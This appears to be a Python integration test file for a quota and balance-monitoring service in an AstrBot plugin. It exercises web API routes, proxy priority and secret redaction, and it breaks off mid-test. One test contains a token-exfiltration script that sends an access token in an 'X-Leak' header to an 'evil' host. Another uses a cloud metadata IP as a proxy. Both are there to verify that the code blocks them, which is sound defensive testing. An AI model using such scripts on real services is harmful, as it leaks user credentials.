"""Host integration tests for PR 9b: QuotaWatchService, QuotaWebEndpoints, MultiStationBalancePort, and backup redaction."""

from __future__ import annotations

import asyncio
from datetime import datetime, timezone
from decimal import Decimal
import json
from pathlib import Path
import tempfile
from types import SimpleNamespace as NS
import unittest
from unittest.mock import AsyncMock, patch

from astrbot_host.model_api import ModelWebAPI
from astrbot_host.quota_service import (
    QuotaWatchService,
    close_quota_watch_services,
    get_quota_watch_service,
    project_legacy_service_balance,
)
from astrbot_host.service_balance import (
    MultiStationBalancePort,
    configured_balance_port,
    propagate_balance_port,
)
from companion_v2.model_gateway.pricing import PricingSettingsStore
from companion_v2.model_gateway.quota import QuotaStationStore
from companion_v2.storage.backup import LEGACY_PRESERVES, OWNED_ROOT_DIRECTORIES, SECRET_KEYS
from tests.test_quota_domain_and_adapters import PNG_BYTES, _FakeResponse, _mock_factory


class _FakeQuery(dict):
    def getlist(self, key):
        return [self[key]] if key in self else []


class _FakeRequest:
    def __init__(self, *, username: str = "admin", body: dict | bytes | None = None, query: dict | None = None):
        self.username = username
        self.query = _FakeQuery(query or {})
        if isinstance(body, dict):
            self._body = json.dumps(body).encode("utf-8")
        elif isinstance(body, bytes):
            self._body = body
        else:
            self._body = b""

    async def body(self):
        return self._body


class _FakeBalanceEvents:
    def __init__(self):
        self.port = None
        self.updates = []

    def update_port(self, port):
        self.port = port
        self.updates.append(port)


class _FakeKeywordMaterials:
    def __init__(self):
        self.invalidated = []

    def invalidate(self, owner):
        self.invalidated.append(owner)


def _make_controller(tmp_dir: str, *, config: dict | None = None, providers: list | None = None):
    sources = providers or [
        {
            "id": "deepseek_official",
            "name": "DeepSeek 官方",
            "provider_type": "chat_completion",
            "enable": True,
            "api_base": "https://api.deepseek.com/v1",
            "key": ["secret-ds-provider-key-999"],
            "proxy": "",
        },
        {
            "id": "openrouter_official",
            "name": "OpenRouter",
            "provider_type": "chat_completion",
            "enable": True,
            "api_base": "https://openrouter.ai/api/v1",
            "key": ["secret-or-provider-key-888"],
            "proxy": "",
        },
    ]
    models = [
        {"id": "ds-chat", "provider_source_id": "deepseek_official", "provider_type": "chat_completion", "enable": True, "model": "deepseek-chat"},
        {"id": "or-claude", "provider_source_id": "openrouter_official", "provider_type": "chat_completion", "enable": True, "model": "claude-sonnet"},
    ]
    context = NS(
        provider_manager=NS(provider_sources_config=sources, providers_config=models),
        get_config=lambda: {"provider_sources": sources, "provider": models},
        get_all_providers=lambda: [],
    )
    runtime = NS(data_root=Path(tmp_dir), installation_id="inst-test")
    app = NS(
        runtime=runtime,
        balance_port=None,
        keyword_materials=_FakeKeywordMaterials(),
        contact_schedule=NS(balance_events=_FakeBalanceEvents()),
        router=NS(providers={}),
    )
    session = NS(application=app, profile=NS(target=None))
    return NS(
        _terminated=False,
        _control_lock=asyncio.Lock(),
        config=config if config is not None else {},
        context=context,
        runtime=runtime,
        data_root=Path(tmp_dir),
        session=session,
        last_session=session,
        now=lambda: datetime(2026, 11, 24, 12, 0, tzinfo=timezone.utc),
    )


class QuotaServiceAndBalanceBridgeTests(unittest.TestCase):
    def test_legacy_service_balance_projection_for_newapi_and_script(self):
        legacy_newapi = project_legacy_service_balance({
            "service_balance": {
                "url": "https://old-relay.example.test",
                "api_key": "nap_legacy_tok",
                "user_id": "101",
                "value_divisor": "500000",
            }
        })
        self.assertIsNotNone(legacy_newapi)
        self.assertEqual(legacy_newapi.id, "legacy-default")
        self.assertEqual(legacy_newapi.adapter_id, "newapi_user_id")
        self.assertEqual(legacy_newapi.user_id, "101")
        self.assertTrue(legacy_newapi.participate_in_awareness)

        legacy_script = project_legacy_service_balance({
            "service_balance": {
                "advanced_enabled": True,
                "advanced_from_astrbot": True,
                "advanced_provider_id": "deepseek_official",
                "advanced_script": "({request:{url:'{{baseUrl}}/b'},extractor:r=>({remaining:1})})",
            }
        })
        self.assertIsNotNone(legacy_script)
        self.assertEqual(legacy_script.adapter_id, "custom_script")
        self.assertEqual(legacy_script.source_mode, "astrbot_provider")
        self.assertEqual(legacy_script.astrbot_provider_id, "deepseek_official")

    def test_single_flight_and_debounce_and_close_cleanup(self):
        async def run():
            with tempfile.TemporaryDirectory() as tmp:
                ctrl = _make_controller(tmp)
                store = QuotaStationStore(Path(tmp))
                _, _, tok = store.read()
                store.upsert_station(
                    tok,
                    {
                        "id": "ds",
                        "name": "DeepSeek",
                        "adapter_id": "deepseek",
                        "source_mode": "astrbot_provider",
                        "astrbot_provider_id": "deepseek_official",
                        "participate_in_awareness": True,
                    },
                )

                hit_count = [0]

                def routes(method, url, _kw):
                    if url.endswith("/user/balance"):
                        hit_count[0] += 1
                        return _FakeResponse(
                            200,
                            {"is_available": True, "balance_infos": [{"currency": "CNY", "total_balance": "88.00"}]},
                        )
                    return _FakeResponse(404, b"")

                factory, _ = _mock_factory(routes)
                service = QuotaWatchService(Path(tmp), ctrl, session_factory=factory, manual_cooldown_seconds=60.0)
                ctrl._quota_watch_services = {str(Path(tmp).resolve()): service}

                # Concurrent refresh_all calls collapse into single-flight (1 upstream balance call)
                r1, r2 = await asyncio.gather(service.refresh_all(force=True), service.refresh_all(force=True))
                self.assertEqual(hit_count[0], 1)
                self.assertTrue(r1["ds"].ok)
                self.assertAlmostEqual(r2["ds"].remaining, 88.0)

                # Debounced call (force=False) within cooldown does not re-hit upstream
                await service.refresh_all(force=False)
                self.assertEqual(hit_count[0], 1)

                # Shutdown cleans registry cleanly
                await close_quota_watch_services(ctrl)
                self.assertEqual(ctrl._quota_watch_services, {})

        asyncio.run(run())

    def test_multi_station_balance_port_all_three_modes_and_multi_role_propagation(self):
        async def run():
            with tempfile.TemporaryDirectory() as tmp:
                ctrl = _make_controller(tmp)
                # Set deterministic FX rate = 7.20
                pstore = PricingSettingsStore(Path(tmp))
                pdoc = pstore.read()
                pstore.update(pdoc["revision"], {"display_currency": "CNY", "exchange_rate": {"mode": "manual", "manual_usd_cny": 7.2}})

                store = QuotaStationStore(Path(tmp))
                _, _, tok = store.read()
                _, _, _, tok = store.upsert_station(
                    tok,
                    {
                        "id": "ds",
                        "name": "DeepSeek 站",
                        "adapter_id": "deepseek",
                        "source_mode": "astrbot_provider",
                        "astrbot_provider_id": "deepseek_official",
                        "participate_in_awareness": True,
                    },
                )
                _, _, _, tok = store.upsert_station(
                    tok,
                    {
                        "id": "or",
                        "name": "OpenRouter 站",
                        "adapter_id": "openrouter",
                        "source_mode": "astrbot_provider",
                        "astrbot_provider_id": "openrouter_official",
                        "low_threshold": 5.0,
                        "critical_threshold": 2.0,
                        "participate_in_awareness": True,
                    },
                )

                factory, _ = _mock_factory({
                    ("GET", "https://api.deepseek.com/user/balance"): _FakeResponse(
                        200, {"is_available": True, "balance_infos": [{"currency": "CNY", "total_balance": "100.00"}]}
                    ),
                    ("GET", "https://openrouter.ai/api/v1/credits"): _FakeResponse(
                        200, {"data": {"total_credits": 20.0, "total_usage": 18.5}}
                    ),
                })
                service = get_quota_watch_service(ctrl, Path(tmp), session_factory=factory)
                self.assertIsNotNone(service)

                # Mode 1: primary (ds)
                _, _, tok = store.update_awareness(tok, {"mode": "primary", "primary_station_id": "ds"})
                port = configured_balance_port(ctrl.config, context=ctrl.context, runtime_root=Path(tmp), controller=ctrl)
                self.assertIsInstance(port, MultiStationBalancePort)
                obs_primary = await port.fetch()
                self.assertEqual(obs_primary.balance, Decimal("100.0"))
                self.assertEqual(obs_primary.unit, "CNY")
                self.assertEqual(obs_primary.plan_name, "DeepSeek 站")

                # Mode 2: aggregate_sum (100 CNY + 1.5 USD * 7.2 = 110.8 CNY)
                _, _, tok = store.update_awareness(tok, {"mode": "aggregate_sum", "target_currency": "CNY"})
                obs_agg = await port.fetch()
                self.assertAlmostEqual(float(obs_agg.balance), 110.8, places=2)
                self.assertEqual(obs_agg.unit, "CNY")
                self.assertIn("2 个站点", obs_agg.extra)

                # Mode 3: any_low -> picks OpenRouter (1.5 <= critical 2.0) over DeepSeek (100 CNY normal)
                _, _, tok = store.update_awareness(tok, {"mode": "any_low"})
                obs_low = await port.fetch()
                self.assertAlmostEqual(float(obs_low.balance), 1.5, places=2)
                self.assertEqual(obs_low.unit, "USD")
                self.assertEqual(obs_low.plan_name, "OpenRouter 站")

                # Multi-role propagation updates ALL sessions on controller
                app2 = NS(
                    keyword_materials=_FakeKeywordMaterials(),
                    contact_schedule=NS(balance_events=_FakeBalanceEvents()),
                    balance_port=None,
                )
                ctrl.sessions = {"role-1": ctrl.session, "role-2": NS(application=app2)}
                propagate_balance_port(ctrl, port)
                self.assertIs(ctrl.session.application.balance_port, port)
                self.assertIs(app2.balance_port, port)
                self.assertEqual(app2.keyword_materials.invalidated, ["service.balance"])
                self.assertEqual(len(app2.contact_schedule.balance_events.updates), 1)

                await close_quota_watch_services(ctrl)

        asyncio.run(run())

    def test_backup_policy_includes_quota_dir_and_scrubs_secrets(self):
        self.assertIn("quota", OWNED_ROOT_DIRECTORIES)
        self.assertIn("quota/", LEGACY_PRESERVES)
        self.assertIn("auth_token", SECRET_KEYS)
        self.assertIn("proxy_url", SECRET_KEYS)


class QuotaWebApiIntegrationTests(unittest.TestCase):
    def test_full_api_routes_crud_detect_test_exchange_and_secret_safety(self):
        async def run():
            with tempfile.TemporaryDirectory() as tmp:
                ctrl = _make_controller(tmp)
                api = ModelWebAPI(ctrl)

                # Verify all 10 quota routes are mounted on ModelWebAPI
                route_paths = {path for path, _h, _m, _d in api.routes()}
                for suffix in (
                    "/quota",
                    "/quota/adapters",
                    "/quota/detect",
                    "/quota/test",
                    "/quota/exchange-token",
                    "/quota/stations",
                    "/quota/stations/delete",
                    "/quota/refresh",
                    "/quota/awareness",
                    "/quota/icon",
                    "/quota/upstream-logs",
                ):
                    self.assertIn("/astrbot_plugin_private_companion/model" + suffix, route_paths)

                factory, _ = _mock_factory({
                    ("GET", "https://relay.example.test/api/status"): _FakeResponse(
                        200,
                        {"success": True, "data": {"system_name": "测试中转站", "quota_display_type": "CNY", "quota_per_unit": 500000, "logo": "/logo.png"}},
                    ),
                    ("GET", "https://relay.example.test/logo.png"): _FakeResponse(200, PNG_BYTES, {"Content-Type": "image/png"}),
                    ("GET", "https://relay.example.test/api/user/self"): _FakeResponse(
                        200,
                        {"success": True, "data": {"id": 9, "username": "demo", "quota": 5000000, "used_quota": 1000000, "group": "pro", "access_token": "tok-exchanged-555"}},
                    ),
                    ("GET", "https://relay.example.test/api/log/self?p=1&page_size=1&type=2"): _FakeResponse(
                        200, {"success": True, "data": {"items": []}}
                    ),
                    ("POST", "https://relay.example.test/api/user/login"): _FakeResponse(
                        200, {"success": True, "data": {"id": 9, "require_2fa": False}}
                    ),
                })
                # Pre-bind mock session_factory on the host service
                get_quota_watch_service(ctrl, Path(tmp), session_factory=factory)

                async def fake_auth(allow_query_keys=()):
                    return (ctrl.session, NS(), NS(), None)

                with patch.object(api, "_run_authorized_read", side_effect=fake_auth):
                    # 1. GET /quota
                    with patch("astrbot_host.quota_api.request", _FakeRequest()):
                        res_dash = await api._quota_api.dashboard()
                    self.assertEqual(res_dash["status"], "ok")
                    edit_token = res_dash["data"]["edit_token"]
                    # Ensure AstrBot provider keys NEVER appear in dashboard response
                    dash_json = json.dumps(res_dash)
                    self.assertNotIn("secret-ds-provider-key-999", dash_json)
                    self.assertNotIn("secret-or-provider-key-888", dash_json)

                    # 2. POST /quota/detect
                    with patch("astrbot_host.quota_api.request", _FakeRequest(body={"base_url": "https://relay.example.test/v1"})):
                        res_det = await api._quota_api.detect()
                    self.assertEqual(res_det["status"], "ok")
                    self.assertEqual(res_det["data"]["adapter_id"], "newapi")
                    self.assertEqual(res_det["data"]["suggested_name"], "测试中转站")

                    # 3. POST /quota/exchange-token (password never saved!)
                    with patch(
                        "astrbot_host.quota_api.request",
                        _FakeRequest(body={"base_url": "https://relay.example.test", "username": "demo", "password": "ephemeral-pw-never-stored"}),
                    ):
                        res_ex = await api._quota_api.exchange_token()
                    self.assertEqual(res_ex["status"], "ok")
                    self.assertEqual(res_ex["data"]["access_token"], "tok-exchanged-555")
                    self.assertEqual(res_ex["data"]["user_id"], "9")

                    # 4. POST /quota/test (draft test without saving)
                    with patch(
                        "astrbot_host.quota_api.request",
                        _FakeRequest(body={"station": {"name": "中转", "adapter_id": "newapi", "base_url": "https://relay.example.test", "auth_token": "tok-exchanged-555"}}),
                    ):
                        res_test = await api._quota_api.test_draft()
                    self.assertEqual(res_test["status"], "ok")
                    self.assertTrue(res_test["data"]["snapshot"]["ok"])
                    self.assertAlmostEqual(res_test["data"]["snapshot"]["remaining"], 10.0)

                    # 5. POST /quota/stations (create + auto probe + live balance_port sync)
                    with patch(
                        "astrbot_host.quota_api.request",
                        _FakeRequest(body={
                            "edit_token": edit_token,
                            "station": {
                                "name": "测试中转站",
                                "adapter_id": "newapi",
                                "base_url": "https://relay.example.test",
                                "auth_token": "tok-exchanged-555",
                                "proxy_url": "http://u:secret-proxy-pw@127.0.0.1:7890",
                                "participate_in_awareness": True,
                            },
                        }),
                    ):
                        res_save = await api._quota_api.save_station()
                    self.assertEqual(res_save["status"], "ok")
                    sid = res_save["data"]["station_id"]
                    edit_token = res_save["data"]["edit_token"]
                    save_json = json.dumps(res_save)
                    self.assertNotIn("tok-exchanged-555", save_json)
                    self.assertNotIn("secret-proxy-pw", save_json)
                    self.assertIsInstance(ctrl.session.application.balance_port, MultiStationBalancePort)

                    # Verify password never written anywhere under tmp
                    for p in Path(tmp).rglob("*"):
                        if p.is_file():
                            self.assertNotIn("ephemeral-pw-never-stored", p.read_text(encoding="utf-8", errors="ignore"))

                    # 6. GET /quota/icon
                    with patch("astrbot_host.quota_api.request", _FakeRequest(query={"id": sid})):
                        res_icon = await api._quota_api.icon()
                    self.assertEqual(res_icon["status"], "ok")
                    self.assertTrue(res_icon["data"]["available"])
                    self.assertTrue(res_icon["data"]["data_url"].startswith("data:image/png;base64,"))

                    # 7. POST /quota/awareness
                    with patch(
                        "astrbot_host.quota_api.request",
                        _FakeRequest(body={"edit_token": edit_token, "awareness": {"mode": "aggregate_sum", "target_currency": "CNY"}}),
                    ):
                        res_aw = await api._quota_api.save_awareness()
                    self.assertEqual(res_aw["status"], "ok")
                    self.assertEqual(res_aw["data"]["awareness"]["mode"], "aggregate_sum")
                    edit_token = res_aw["data"]["edit_token"]

                    # 8. POST /quota/stations/delete
                    with patch(
                        "astrbot_host.quota_api.request",
                        _FakeRequest(body={"edit_token": edit_token, "station_id": sid}),
                    ):
                        res_del = await api._quota_api.delete_station()
                    self.assertEqual(res_del["status"], "ok")
                    self.assertEqual(res_del["data"]["stations"], [])

                await close_quota_watch_services(ctrl)

        asyncio.run(run())

    def test_test_draft_blocks_stored_token_exfiltration_across_origins_or_script_switch(self):
        async def run():
            with tempfile.TemporaryDirectory() as tmp:
                calls = []

                def router(method, url, kwargs):
                    calls.append((method, url, dict(kwargs.get("headers") or {})))
                    if url.endswith("/api/status"):
                        return _FakeResponse(200, {"success": True, "data": {"quota_display_type": "USD", "quota_per_unit": 500000}})
                    return _FakeResponse(200, {"success": True, "data": {"quota": 500000, "used_quota": 0}})

                ctrl = _make_controller(tmp)
                svc = get_quota_watch_service(ctrl, Path(tmp), session_factory=_mock_factory(router)[0])
                _, _, tok = svc.store.read()
                svc.store.upsert_station(
                    tok,
                    {
                        "id": "st1",
                        "name": "原站",
                        "adapter_id": "newapi",
                        "base_url": "https://origin-a.example.test",
                        "auth_token": "secret-origin-a-tok",
                    },
                )

                # Same origin reuses stored token cleanly
                res_same = await svc.test_draft({
                    "id": "st1",
                    "name": "原站",
                    "adapter_id": "newapi",
                    "base_url": "https://origin-a.example.test/v1",
                    "auth_token": "",
                })
                self.assertTrue(res_same["snapshot"]["ok"])
                self.assertTrue(any(h.get("Authorization") == "Bearer secret-origin-a-tok" for _, u, h in calls if "origin-a.example.test" in u))

                # Different origin MUST NOT receive stored token
                calls.clear()
                res_cross = await svc.test_draft({
                    "id": "st1",
                    "name": "原站",
                    "adapter_id": "newapi",
                    "base_url": "https://evil-b.example.test",
                    "auth_token": "",
                })
                self.assertFalse(res_cross["snapshot"]["ok"])
                self.assertEqual(res_cross["snapshot"]["error_code"], "missing_credentials")
                self.assertFalse(any("secret-origin-a-tok" in json.dumps(h) for _, _, h in calls))

                # Switching from non-script adapter to custom_script MUST NOT receive stored token
                with patch("astrbot_host.quota_adapters.script_adapter.ScriptServiceBalancePort") as mock_script:
                    mock_script.return_value.fetch = AsyncMock(side_effect=RuntimeError("no token"))
                    await svc.test_draft({
                        "id": "st1",
                        "name": "原站",
                        "adapter_id": "custom_script",
                        "base_url": "https://origin-a.example.test",
                        "auth_token": "",
                        "custom_script": "({request:{url:'https://evil.example.test',headers:{'X-Leak':'{{accessToken}}'}},extractor:r=>({remaining:1})})",
                    })
                    if mock_script.called:
                        _, kwargs = mock_script.call_args
                        self.assertEqual(kwargs.get("access_token", ""), "")
                        self.assertEqual(kwargs.get("api_key", ""), "")

                await close_quota_watch_services(ctrl)

        asyncio.run(run())

    def test_legacy_projection_materializes_cleanly_on_edit_and_awareness_save(self):
        async def run():
            with tempfile.TemporaryDirectory() as tmp:
                ctrl = _make_controller(
                    tmp,
                    config={
                        "service_balance": {
                            "url": "https://legacy.example.test",
                            "api_key": "legacy-secret-tok-777",
                            "value_divisor": "500000",
                        }
                    },
                )

                def router(method, url, _kw):
                    if url.endswith("/api/status"):
                        return _FakeResponse(200, {"success": True, "data": {"quota_display_type": "USD", "quota_per_unit": 500000}})
                    if url.endswith("/api/user/self"):
                        return _FakeResponse(200, {"success": True, "data": {"quota": 5_000_000, "used_quota": 0}})
                    return _FakeResponse(200, {"success": True, "data": {"items": []}})

                get_quota_watch_service(ctrl, Path(tmp), session_factory=_mock_factory(router)[0])
                api = ModelWebAPI(ctrl)

                async def fake_auth(allow_query_keys=()):
                    return (ctrl.session, NS(), NS(), None)

                with patch.object(api, "_run_authorized_read", side_effect=fake_auth):
                    # Initial dashboard shows legacy_projected=True with legacy-default
                    with patch("astrbot_host.quota_api.request", _FakeRequest()):
                        res0 = await api._quota_api.dashboard()
                    self.assertTrue(res0["data"]["legacy_projected"])
                    self.assertEqual(res0["data"]["stations"][0]["id"], "legacy-default")
                    self.assertTrue(res0["data"]["stations"][0]["has_token"])
                    tok0 = res0["data"]["edit_token"]

                    # Deleting unmaterialized legacy projection returns explicit quota_legacy_readonly
                    with patch(
                        "astrbot_host.quota_api.request",
                        _FakeRequest(body={"edit_token": tok0, "station_id": "legacy-default"}),
                    ):
                        res_del = await api._quota_api.delete_station()
                    self.assertEqual(res_del["status"], "error")
                    self.assertEqual(res_del["data"]["code"], "quota_legacy_readonly")

                    # Saving awareness policy targeting legacy-default materializes store cleanly
                    with patch(
                        "astrbot_host.quota_api.request",
                        _FakeRequest(body={
                            "edit_token": tok0,
                            "awareness": {"mode": "primary", "primary_station_id": "legacy-default", "target_currency": "CNY"},
                        }),
                    ):
                        res_aw = await api._quota_api.save_awareness()
                    self.assertEqual(res_aw["status"], "ok")
                    self.assertFalse(res_aw["data"]["legacy_projected"])
                    tok1 = res_aw["data"]["edit_token"]

                    # Verify legacy token survived materialization and blank-token edit still preserves it!
                    svc = get_quota_watch_service(ctrl, Path(tmp))
                    stored, _, _ = svc.store.read()
                    self.assertEqual(stored[0].auth_token, "legacy-secret-tok-777")

                    with patch(
                        "astrbot_host.quota_api.request",
                        _FakeRequest(body={
                            "edit_token": tok1,
                            "station": {
                                "id": "legacy-default",
                                "name": "已升级旧站点",
                                "adapter_id": "newapi",
                                "base_url": "https://legacy.example.test",
                                "auth_token": "",
                            },
                            "probe_after_save": False,
                        }),
                    ):
                        res_edit = await api._quota_api.save_station()
                    self.assertEqual(res_edit["status"], "ok")
                    stored2, _, _ = svc.store.read()
                    self.assertEqual(stored2[0].name, "已升级旧站点")
                    self.assertEqual(stored2[0].auth_token, "legacy-secret-tok-777")

                await close_quota_watch_services(ctrl)

            # Also verify editing legacy-default directly (before save_awareness) preserves legacy token
            with tempfile.TemporaryDirectory() as tmp2:
                ctrl2 = _make_controller(
                    tmp2,
                    config={
                        "service_balance": {
                            "url": "https://legacy2.example.test",
                            "api_key": "legacy-direct-tok-888",
                            "value_divisor": "500000",
                        }
                    },
                )
                get_quota_watch_service(ctrl2, Path(tmp2), session_factory=_mock_factory({})[0])
                api2 = ModelWebAPI(ctrl2)

                async def fake_auth2(allow_query_keys=()):
                    return (ctrl2.session, NS(), NS(), None)

                with patch.object(api2, "_run_authorized_read", side_effect=fake_auth2):
                    with patch("astrbot_host.quota_api.request", _FakeRequest()):
                        d0 = await api2._quota_api.dashboard()
                    with patch(
                        "astrbot_host.quota_api.request",
                        _FakeRequest(body={
                            "edit_token": d0["data"]["edit_token"],
                            "station": {
                                "id": "legacy-default",
                                "name": "直接编辑迁移",
                                "adapter_id": "newapi",
                                "base_url": "https://legacy2.example.test",
                                "auth_token": "",
                            },
                            "probe_after_save": False,
                        }),
                    ):
                        r_ed = await api2._quota_api.save_station()
                    self.assertEqual(r_ed["status"], "ok")
                    self.assertFalse(r_ed["data"]["legacy_projected"])
                    stored3, _, _ = get_quota_watch_service(ctrl2, Path(tmp2)).store.read()
                    self.assertEqual(stored3[0].auth_token, "legacy-direct-tok-888")
                await close_quota_watch_services(ctrl2)

        asyncio.run(run())

    def test_global_http_proxy_priority_and_awareness_refresh_preserves_logo_version(self):
        async def run():
            with tempfile.TemporaryDirectory() as tmp:
                from datetime import timedelta

                now_box = [datetime(2026, 11, 24, 12, 0, tzinfo=timezone.utc)]
                seen_proxies: list[tuple[str, str]] = []

                def factory(**session_kwargs):
                    proxy_used = str(session_kwargs.get("proxy_url") or "")

                    def handler(method, url, _kw):
                        seen_proxies.append((url, proxy_used))
                        if url.endswith("/api/status"):
                            return _FakeResponse(
                                200,
                                {"success": True, "data": {"system_name": "示例站", "quota_display_type": "CNY", "quota_per_unit": 500000, "logo": "/brand/cat.svg"}},
                            )
                        if url.endswith("/brand/cat.svg"):
                            return _FakeResponse(
                                200,
                                b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><rect x="1" y="1" width="14" height="14" fill="#3a8"/></svg>',
                                {"Content-Type": "image/svg+xml"},
                            )
                        if url.endswith("/api/user/self"):
                            return _FakeResponse(200, {"success": True, "data": {"quota": 2500000, "used_quota": 500000}})
                        if url.endswith("/user/balance"):
                            return _FakeResponse(200, {"is_available": True, "balance_infos": [{"currency": "CNY", "total_balance": "50.00"}]})
                        return _FakeResponse(200, {"success": True, "data": {"items": []}})

                    from tests.test_quota_domain_and_adapters import _FakeSession

                    return _FakeSession(handler)

                providers = [
                    {
                        "id": "prov_with_proxy",
                        "name": "DeepSeek 代理",
                        "provider_type": "chat_completion",
                        "enable": True,
                        "api_base": "https://api.deepseek.com/v1",
                        "key": ["ds-key-1"],
                        "proxy": "http://127.0.0.1:7891",
                    },
                    {
                        "id": "prov_no_proxy",
                        "name": "DeepSeek 默认",
                        "provider_type": "chat_completion",
                        "enable": True,
                        "api_base": "https://api.deepseek.com/v1",
                        "key": ["ds-key-2"],
                        "proxy": "",
                    },
                ]
                ctrl = _make_controller(tmp, providers=providers)
                ctrl.now = lambda: now_box[0]
                ctrl.context.get_config = lambda: {
                    "provider_sources": providers,
                    "provider": [],
                    "http_proxy": "http://127.0.0.1:7890",
                }
                svc = QuotaWatchService(Path(tmp), ctrl, now=lambda: now_box[0], session_factory=factory)
                _, _, tok = svc.store.read()
                _, _, _, tok = svc.store.upsert_station(
                    tok,
                    {
                        "id": "st-station-proxy",
                        "name": "站级代理",
                        "adapter_id": "deepseek",
                        "source_mode": "astrbot_provider",
                        "astrbot_provider_id": "prov_with_proxy",
                        "proxy_url": "http://127.0.0.1:7892",
                    },
                )
                _, _, _, tok = svc.store.upsert_station(
                    tok,
                    {
                        "id": "st-prov-proxy",
                        "name": "供应商代理",
                        "adapter_id": "deepseek",
                        "source_mode": "astrbot_provider",
                        "astrbot_provider_id": "prov_with_proxy",
                    },
                )
                _, _, _, tok = svc.store.upsert_station(
                    tok,
                    {
                        "id": "st-global-proxy",
                        "name": "全局代理",
                        "adapter_id": "newapi",
                        "base_url": "https://cat.example.test",
                        "auth_token": "tok-cat",
                        "participate_in_awareness": True,
                    },
                )

                # Priority 1: station proxy_url beats provider proxy and global http_proxy
                seen_proxies.clear()
                await svc.refresh_station("st-station-proxy")
                bal_proxies = [p for u, p in seen_proxies if u.endswith("/user/balance")]
                self.assertEqual(bal_proxies, ["http://127.0.0.1:7892"])

                # Priority 2: bound provider proxy beats global http_proxy
                seen_proxies.clear()
                await svc.refresh_station("st-prov-proxy")
                bal_proxies = [p for u, p in seen_proxies if u.endswith("/user/balance")]
                self.assertEqual(bal_proxies, ["http://127.0.0.1:7891"])

                # Priority 3: global AstrBot http_proxy used when both station & provider proxy are empty
                seen_proxies.clear()
                snap_cat = await svc.refresh_station("st-global-proxy")
                self.assertTrue(snap_cat.ok)
                self.assertTrue(snap_cat.logo_version)
                self.assertTrue(any(p == "http://127.0.0.1:7890" for u, p in seen_proxies if "cat.example.test" in u))
                icon_payload = svc.get_icon_payload("st-global-proxy")
                self.assertTrue(icon_payload["available"])
                self.assertEqual(icon_payload["mime_type"], "image/svg+xml")
                self.assertTrue(icon_payload["data_url"].startswith("data:image/svg+xml;base64,"))

                # detect() also inherits AstrBot global http_proxy when proxy_url is empty
                seen_proxies.clear()
                await svc.detect(base_url="https://cat.example.test")
                self.assertTrue(any(p == "http://127.0.0.1:7890" for u, p in seen_proxies if "cat.example.test" in u))

                # Awareness refresh after snapshot becomes stale MUST preserve cached logo_version!
                saved_logo_ver = snap_cat.logo_version
                now_box[0] = now_box[0] + timedelta(minutes=10)
                stations, _, _, _ = svc._effective_stations()
                cat_spec = next(st for st in stations if st.id == "st-global-proxy")
                refreshed_map = await svc.refresh_for_awareness([cat_spec])
                self.assertEqual(refreshed_map["st-global-proxy"].logo_version, saved_logo_ver)
                persisted_snaps, _ = svc.snapshot_cache.all()
                self.assertEqual(persisted_snaps["st-global-proxy"].logo_version, saved_logo_ver)

                # Metadata global http_proxy is safely ignored instead of crashing probes
                ctrl.context.get_config = lambda: {
                    "provider_sources": providers,
                    "provider": [],
                    "http_proxy": "http://169.254.169.254:8080",
                }
                self.assertEqual(svc._resolve_global_http_proxy(), "")

                await svc.close()

        asyncio.run(run())

    def test_balance_metadata_upstream_logs_cache_and_pricing_resolver_bridge(self):
        async def run():
            with tempfile.TemporaryDirectory() as tmp:
                log_fetches = [0]

                def router(method, url, _kw):
                    if url.endswith("/api/status"):
                        return _FakeResponse(
                            200,
                            {
                                "success": True,
                                "data": {
                                    "system_name": "星渊",
                                    "server_address": "https://api.syuan.org",
                                    "quota_display_type": "CNY",
                                    "quota_per_unit": 500000,
                                    "usd_exchange_rate": 1,
                                    "price": 1,
                                },
                            },
                        )
                    if url.endswith("/api/user/self"):
                        return _FakeResponse(
                            200,
                            {"success": True, "data": {"id": 12, "username": "xy", "quota": 31805000, "used_quota": 5000000, "group": "vip"}},
                        )
                    if url.endswith("/api/subscription/self"):
                        return _FakeResponse(404, b"")
                    if "/api/log/self?p=1&page_size=1&type=2" in url:
                        return _FakeResponse(200, {"success": True, "data": {"items": []}})
                    if "/api/log/self?p=1&page_size=40&type=2" in url:
                        log_fetches[0] += 1
                        return _FakeResponse(
                            200,
                            {
                                "success": True,
                                "data": {
                                    "items": [
                                        {
                                            "created_at": 1795470000,
                                            "model_name": "gemini-4-hydrogen",
                                            "token_name": "companion-bot",
                                            "group": "vip",
                                            "prompt_tokens": 10000,
                                            "completion_tokens": 500,
                                            "quota": 500000,
                                            "other": json.dumps({"billing_source": "subscription", "cache_tokens": 6000, "group_ratio": 0.65}),
                                        },
                                        {
                                            "created_at": 1795460000,
                                            "model_name": "claude-sonnet",
                                            "token_name": "cli-dev",
                                            "group": "default",
                                            "prompt_tokens": 2000,
                                            "completion_tokens": 400,
                                            "quota": 1000000,
                                            "other": json.dumps({"billing_source": "wallet", "cache_tokens": 0, "group_ratio": 1.0}),
                                        },
                                    ]
                                },
                            },
                        )
                    return _FakeResponse(404, b"")

                ctrl = _make_controller(tmp)
                svc = get_quota_watch_service(ctrl, Path(tmp), session_factory=_mock_factory(router)[0])
                _, _, tok = svc.store.read()
                _, _, _, tok = svc.store.upsert_station(
                    tok,
                    {
                        "id": "syuan",
                        "name": "星渊",
                        "adapter_id": "newapi_user_id",
                        "base_url": "https://aiapi.syuan.org",
                        "auth_token": "tok-syuan-secret",
                        "user_id": "12",
                        "participate_in_awareness": True,
                    },
                )
                svc.store.update_awareness(tok, {"mode": "primary", "primary_station_id": "syuan"})
                await svc.refresh_station("syuan")

                # 1) MultiStationBalancePort.balance_metadata works on both success & error paths
                port = configured_balance_port(ctrl.config, context=ctrl.context, runtime_root=Path(tmp), controller=ctrl)
                obs = await port.fetch()
                meta = port.balance_metadata(obs)
                self.assertEqual(meta["source_kind"], "quota_dashboard")
                self.assertEqual(meta["awareness_mode"], "primary")
                self.assertEqual(meta["station_id"], "syuan")
                self.assertEqual(meta["station_name"], "星渊")
                self.assertTrue(meta["is_primary_explicit"])
                self.assertEqual(meta["participating_count"], 1)
                self.assertEqual(meta["currency_symbol"], "¥")

                # Even without observation (error path), station_name stays populated
                meta_err = port.balance_metadata(None)
                self.assertEqual(meta_err["station_name"], "星渊")
                self.assertEqual(meta_err["source_kind"], "quota_dashboard")

                # 2) GET /quota/upstream-logs: wallet vs subscription, cache hit rate, 5-min cache on token_name filter
                api = ModelWebAPI(ctrl)

                async def fake_auth(allow_query_keys=()):
                    return (ctrl.session, NS(), NS(), None)

                with patch.object(api, "_run_authorized_read", side_effect=fake_auth):
